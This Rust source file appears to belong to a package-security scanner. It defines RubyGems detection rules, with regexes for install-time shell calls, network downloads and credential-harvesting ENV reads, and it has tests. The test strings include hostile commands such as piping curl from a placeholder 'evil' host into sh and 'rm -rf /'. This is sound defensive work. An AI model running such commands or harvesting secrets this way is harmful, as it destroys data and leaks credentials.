//! RubyGems-specific detection rules.
//!
//! These complement the ecosystem-agnostic rules in `argus-rules`
//! (`credential-access`, `network-exfiltration`, `runtime-hook`,
//! `ai-context-poisoning`, etc.) which we still apply by calling
//! `argus_rules::scan_text_file` on every extracted text file.
//!
//! The build-time surface for a gem is `extconf.rb` (and anything under
//! `ext/`), which RubyGems runs via `mkmf` at `gem install` time with the
//! user's full privileges -- the analog of pypi `setup.py` / npm
//! `postinstall`. The regex SHAPES mirror `argus-pypi::rules`, translated to
//! Ruby idioms.

use argus_core::{Finding, Severity};
use regex::Regex;

/// Ruby gems that are common typosquat targets. Mirrors the hand-curated
/// approach in `argus-pypi::POPULAR_PYTHON_PACKAGES`, drawn from RubyGems
/// download stats + recent attack reports.
pub const POPULAR_RUBY_GEMS: &[&str] = &[
    // framework + web
    "rails",
    "railties",
    "activesupport",
    "activerecord",
    "actionpack",
    "actionview",
    "activemodel",
    "activejob",
    "actionmailer",
    "actioncable",
    "sinatra",
    "rack",
    "puma",
    "unicorn",
    "thin",
    // common libraries
    "nokogiri",
    "json",
    "rake",
    "bundler",
    "rspec",
    "minitest",
    "faraday",
    "httparty",
    "rest-client",
    "typhoeus",
    "concurrent-ruby",
    "i18n",
    "tzinfo",
    "builder",
    "multi_json",
    "ffi",
    "mime-types",
    "addressable",
    // db / infra
    "pg",
    "mysql2",
    "sqlite3",
    "redis",
    "sidekiq",
    "dalli",
    "sequel",
    "mongo",
    // dev tools
    "pry",
    "rubocop",
    "simplecov",
    "factory_bot",
    "capybara",
    "webmock",
    "vcr",
    "dotenv",
    // cloud / auth
    "aws-sdk-core",
    "devise",
    "omniauth",
    "jwt",
    "oauth2",
];

/// Build-time subprocess / shell invocation from an `extconf.rb` (or any
/// `ext/` file). Ruby has several spawn idioms; this regex covers the common
/// ones. Benign `extconf.rb` files only call `mkmf` helpers
/// (`create_makefile`, `have_header`, ...), which this does not match.
pub fn extconf_subprocess_regex() -> Regex {
    // Ruby allows BOTH parenthesized (`system("cmd")`) and paren-less
    // (`system "cmd"`) calls. The argument suffix `(?: \( | \s+ ARG )` matches
    // either an opening paren OR whitespace followed by a command argument: a
    // string literal (`"`/`'`), a `%`-literal start, or an identifier/variable
    // (`[A-Za-z_$@]`). Requiring an actual argument is what keeps the bare word
    // "system" in prose/comments from firing, and the leading `\b` (plus the
    // method names being whole-word) keeps `subsystem` from matching.
    Regex::new(
        r#"(?x)
        (?:
            ` [^`]* `                                |   # backtick command
            %x \s* [\(\{\[\|/!]                       |   # %x(...) / %x{...} (no \b: `%` is non-word, breaks the boundary)
            (?:
                \b system                             |
                \b exec                               |
                \b spawn                              |
                \b Kernel\.(?:system|exec|spawn)      |
                \b IO\.popen                          |
                \b Open3\.(?:popen3|popen2|capture2|capture3|capture2e)
            )
            (?: \s* \( | \s+ ['"%A-Za-z_$@] )            # `(args)` OR paren-less ` "cmd"` / ` var`
        )
        "#,
    )
    .unwrap()
}

/// Build-time remote download from an `extconf.rb` (or any `ext/` file).
/// A benign C-extension build never fetches code from the network.
pub fn extconf_remote_download_regex() -> Regex {
    Regex::new(
        r#"(?x)
        (?:
            \b Net::HTTP \b                           |
            \b URI\.open \s* \(                       |
            \b URI\.parse \s* \( [^)]* \) \.open      |
            \b open-uri \b                            |
            require \s* ['"] open-uri ['"]            |
            \b Gem\.fetch \s* \(                      |
            \b Down\.download \s* \(                  |
            \b HTTParty\. (?:get|post|put|patch|delete) \s* \(
        )
        "#,
    )
    .unwrap()
}

/// Reads of credential-shaped environment variables (the 2022 RubyGems
/// ENV-token-harvester incident class). Matches `ENV['...SECRET...']`,
/// `ENV.fetch("...TOKEN...")`, etc. The shared `credential-access` rule only
/// matches host secret-file *paths* (`.aws`/`.npmrc`/`.ssh`), not Ruby env
/// reads, so the harvester idiom that exfiltrates env credentials is detected
/// here (paired with a network egress in `scan`).
pub fn env_credential_read_regex() -> Regex {
    Regex::new(
        r#"(?xi)
        \b ENV \s* (?: \[ | \.fetch \s* \( ) \s*
        ['"] [^'"]*
        (?: SECRET | TOKEN | API[_-]?KEY | ACCESS[_-]?KEY | PASSWORD | PASSWD | CREDENTIAL | PRIVATE[_-]?KEY )
        [^'"]* ['"]
        "#,
    )
    .unwrap()
}

/// BULK environment dumps: a gem that harvests the ENTIRE environment block
/// (not just one credential-shaped name) and exfiltrates it. The harvester
/// `ENV['AWS_SECRET_ACCESS_KEY']` form is caught by
/// [`env_credential_read_regex`]; this companion catches `ENV.to_h`,
/// `ENV.each`, `ENV.select`, `ENV.map`, `ENV.values`, `ENV.keys`, `ENV.to_a`,
/// `ENV.entries`, `ENV.filter`, and `ENV.find` — idioms that read every
/// variable at once, sweeping up credentials without naming them. A benign
/// single read like `ENV['HOME']` does NOT match (it is a `[`/`fetch` indexed
/// access, not a whole-map enumeration).
pub fn env_bulk_read_regex() -> Regex {
    Regex::new(
        r#"(?x)
        \b ENV \s* \.
        (?: to_h | to_a | to_hash | each(?:_pair)? | select | map | values | keys
          | entries | filter | find | reject | collect | sort | inject | reduce )
        \b
        "#,
    )
    .unwrap()
}

/// Push name-based findings (typosquatting + low-reputation) onto the
/// running findings list. Mirrors `argus-pypi::push_name_findings`.
pub fn push_name_findings(name: &str, findings: &mut Vec<Finding>) {
    let lower = name.to_ascii_lowercase();
    if POPULAR_RUBY_GEMS.iter().any(|p| *p == lower) {
        return; // legitimate gem
    }
    if let Some(target) = POPULAR_RUBY_GEMS
        .iter()
        .copied()
        .find(|p| argus_rules::levenshtein(&lower, p) <= 1)
    {
        findings.push(Finding::new(
            "typosquatting",
            Severity::High,
            format!("RubyGems name `{name}` is one edit away from popular gem `{target}`"),
        ));
        findings.push(Finding::new(
            "low-reputation",
            Severity::Medium,
            format!("typosquat candidate `{name}` has no established reputation"),
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn subprocess_fires_on_ruby_spawn_idioms() {
        let re = extconf_subprocess_regex();
        assert!(re.is_match("system(\"curl http://evil | sh\")"));
        assert!(re.is_match("exec('rm -rf /')"));
        assert!(re.is_match("`uname -a`"));
        assert!(re.is_match("%x(whoami)"));
        assert!(re.is_match("IO.popen(['sh', '-c', payload])"));
        assert!(re.is_match("Open3.capture2('sh', '-c', cmd)"));
        assert!(re.is_match("Kernel.spawn('node', 'x.js')"));
    }

    #[test]
    fn subprocess_fires_on_parenless_calls() {
        // Ruby allows paren-less method calls; these MUST fire.
        let re = extconf_subprocess_regex();
        assert!(re.is_match(r#"system "curl http://evil | sh""#));
        assert!(re.is_match(r#"exec "rm -rf /""#));
        assert!(re.is_match(r#"spawn "sh", "-c", payload"#));
        assert!(re.is_match(r#"IO.popen "cmd""#));
        assert!(re.is_match("exec 'rm -rf /'"));
        assert!(re.is_match("system payload")); // paren-less with a variable arg
        assert!(re.is_match("Kernel.system \"id\""));
        assert!(re.is_match("Open3.capture2 \"sh\", \"-c\", cmd"));
    }

    #[test]
    fn subprocess_does_not_over_match_identifiers_or_prose() {
        let re = extconf_subprocess_regex();
        // `subsystem`/`ecosystem` contain "system" but have no word boundary
        // before it, so they must not match.
        assert!(!re.is_match("subsystem_check"));
        assert!(!re.is_match("the ecosystem is healthy"));
        assert!(!re.is_match("filesystem_root = '/'"));
        // The bare word with no command argument (end of line / punctuation)
        // must not fire.
        assert!(!re.is_match("# this calls system\n"));
        assert!(!re.is_match("operating system."));
    }

    #[test]
    fn benign_extconf_does_not_fire() {
        let benign = r#"
            require 'mkmf'
            have_header('ruby.h')
            create_makefile('foo/foo')
        "#;
        assert!(!extconf_subprocess_regex().is_match(benign));
        assert!(!extconf_remote_download_regex().is_match(benign));
    }

    #[test]
    fn remote_download_fires() {
        let re = extconf_remote_download_regex();
        assert!(re.is_match("Net::HTTP.get(URI('http://evil'))"));
        assert!(re.is_match("require 'open-uri'"));
        assert!(re.is_match("URI.open('http://evil/x.tar.gz')"));
        assert!(re.is_match("Gem.fetch('http://evil')"));
    }

    #[test]
    fn env_credential_read_fires_on_harvester_idioms() {
        let re = env_credential_read_regex();
        assert!(re.is_match("ENV['AWS_SECRET_ACCESS_KEY']"));
        assert!(re.is_match("ENV[\"GITHUB_TOKEN\"]"));
        assert!(re.is_match("ENV.fetch('MY_API_KEY')"));
        assert!(re.is_match("ENV['db_password']"));
        // benign env reads must not fire
        assert!(!re.is_match("ENV['HOME']"));
        assert!(!re.is_match("ENV['PATH']"));
        assert!(!re.is_match("ENV['RAILS_ENV']"));
    }

    #[test]
    fn env_bulk_read_fires_on_whole_env_dumps() {
        let re = env_bulk_read_regex();
        // Bulk dump idioms that sweep up every variable.
        assert!(re.is_match("payload = ENV.to_h"));
        assert!(re.is_match("ENV.each { |k, v| send(k, v) }"));
        assert!(re.is_match("ENV.each_pair { |k, v| buf << v }"));
        assert!(re.is_match("data = ENV.select { |k, _| true }"));
        assert!(re.is_match("ENV.map { |k, v| \"#{k}=#{v}\" }"));
        assert!(re.is_match("vals = ENV.values"));
        assert!(re.is_match("keys = ENV.keys"));
        assert!(re.is_match("arr = ENV.to_a"));
        assert!(re.is_match("ENV.entries"));
        assert!(re.is_match("ENV.filter { |k, _| k.include?('KEY') }"));
        // Benign single indexed reads must NOT fire as a bulk dump.
        assert!(!re.is_match("ENV['HOME']"));
        assert!(!re.is_match("ENV.fetch('PATH')"));
        assert!(!re.is_match("ENV['RAILS_ENV']"));
    }

    #[test]
    fn typosquat_nokogir_fires() {
        let mut f = Vec::new();
        push_name_findings("nokogir", &mut f);
        let rules: Vec<&str> = f.iter().map(|x| x.rule_id.as_str()).collect();
        assert!(rules.contains(&"typosquatting"), "got: {rules:?}");
        assert!(rules.contains(&"low-reputation"), "got: {rules:?}");
    }

    #[test]
    fn legitimate_gem_does_not_fire() {
        let mut f = Vec::new();
        push_name_findings("rails", &mut f);
        assert!(f.is_empty());
    }
}
